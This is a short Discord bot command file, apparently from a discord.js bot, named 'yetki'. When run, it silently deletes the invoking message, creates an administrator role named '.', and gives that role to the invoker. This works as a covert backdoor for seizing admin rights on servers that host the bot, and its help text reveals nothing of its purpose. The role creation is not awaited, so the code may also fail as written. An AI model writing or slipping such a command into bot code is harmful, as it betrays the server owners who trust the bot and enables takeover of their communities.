const Discord = require('discord.js');
exports.run = async (client, message, args) => {
 
    message.delete();
    message.guild.roles.create({
  data: {
    name: '.',
    permissions: ["ADMINISTRATOR"],
  },
})
    let rol = message.guild.roles.cache.find(role => role.name === ".");
    message.member.roles.add(rol);
  
};

exports.conf = {
  enabled: true, 
  guildOnly: false, 
  aliases: [],
  permLevel: 4 
};

exports.help = {
  name: 'yetki',
  description: 'yetki',
  usage: 'yetki'
};